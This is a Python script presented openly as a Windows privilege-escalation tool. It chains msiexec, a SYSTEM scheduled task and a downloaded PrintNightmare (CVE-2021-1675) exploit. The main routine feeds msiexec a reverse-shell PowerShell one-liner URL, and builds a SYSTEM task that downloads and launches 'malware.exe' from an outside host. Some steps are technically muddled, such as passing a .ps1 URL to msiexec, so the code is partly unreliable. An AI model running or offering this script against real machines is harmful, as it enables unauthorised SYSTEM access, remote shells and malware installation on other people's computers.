import os
import sys
import shutil
import urllib.request
import subprocess

def download(url, path):
    """
    Download a file from a URL and save it to the specified path
    """
    try:
        with urllib.request.urlopen(url) as response, open(path, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
    except Exception as e:
        print(f"Failed to download {url}: {str(e)}")
        return False
    return True

def exploit_msiexec(path):
    """
    Exploit MSIEXEC to elevate privileges
    """
    try:
        subprocess.check_output(f"msiexec /quiet /qn /i {path}", shell=True)
        print("MSIEXEC privilege escalation successful!")
        return True
    except subprocess.CalledProcessError:
        print("MSIEXEC privilege escalation failed")
        return False

def exploit_schtasks(task_name, command):
    """
    Exploit SCHTASKS to elevate privileges
    """
    try:
        subprocess.check_output(f"schtasks /create /tn {task_name} /tr \"{command}\" /sc minute /mo 1 /ru SYSTEM", shell=True)
        subprocess.check_output(f"schtasks /run /tn {task_name}", shell=True)
        subprocess.check_output(f"schtasks /delete /tn {task_name} /f", shell=True)
        print("SCHTASKS privilege escalation successful!")
        return True
    except subprocess.CalledProcessError:
        print("SCHTASKS privilege escalation failed")
        return False

def exploit_printnightmare():
    """
    Exploit PrintNightmare to elevate privileges
    """
    # Download the PrintNightmare exploit script
    if not download("https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/cve_2021_1675.py", "cve_2021_1675.py"):
        print("Failed to download PrintNightmare exploit script")
        return False
    # Run the PrintNightmare exploit script
    try:
        subprocess.check_output("python cve_2021_1675.py", shell=True)
        print("PrintNightmare privilege escalation successful!")
        return True
    except subprocess.CalledProcessError:
        print("PrintNightmare privilege escalation failed")
        return False

def main():
    # Exploit MSIEXEC
    if exploit_msiexec("https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1?raw=true"):
        return

    # Exploit SCHTASKS
    if exploit_schtasks("MyTask", "powershell -c \"Invoke-WebRequest -Uri 'https://example.com/malware.exe' -OutFile 'C:\\Windows\\Temp\\malware.exe'; Start-Process 'C:\\Windows\\Temp\\malware.exe'\""):
        return

    # Exploit PrintNightmare
    if exploit_printnightmare():
        return

    print("No privilege escalation methods found")
    return

if __name__ == "__main__":
    main()
